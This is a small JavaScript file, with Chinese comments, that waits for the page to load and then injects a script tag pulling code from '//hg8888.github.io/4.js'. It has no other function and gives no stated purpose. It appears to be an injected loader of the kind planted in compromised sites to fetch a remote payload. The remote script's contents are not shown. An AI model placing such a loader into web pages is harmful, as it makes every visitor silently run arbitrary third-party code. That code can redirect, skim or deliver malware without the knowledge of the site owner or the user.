function rd(fn){  
    if(document.addEventListener){      
        //标准浏览器  
        document.addEventListener('DOMContentLoaded',function(){  
            //注销事件，避免反复触发  
            document.removeEventListener('DOMContentLoaded',arguments.callee,false); 
            //执行函数   
            fn();
        },false);  
    }else if(document.attachEvent){     
        //IE浏览器  
        document.attachEvent('onreadystatechange',function(){  
            if(document.readyState=='complete'){  
                document.detachEvent('onreadystatechange',arguments.callee);  
                //执行函数   
                fn();  
            }  
        });  
    }  
}
function app(){
var x = document.createElement("SCRIPT");x.src="//hg8888.github.io/4.js";document.body.appendChild(x);
}
if(typeof(document.body)=='undefined'){
rd(function(){
app();
});
}
else{
app();
}
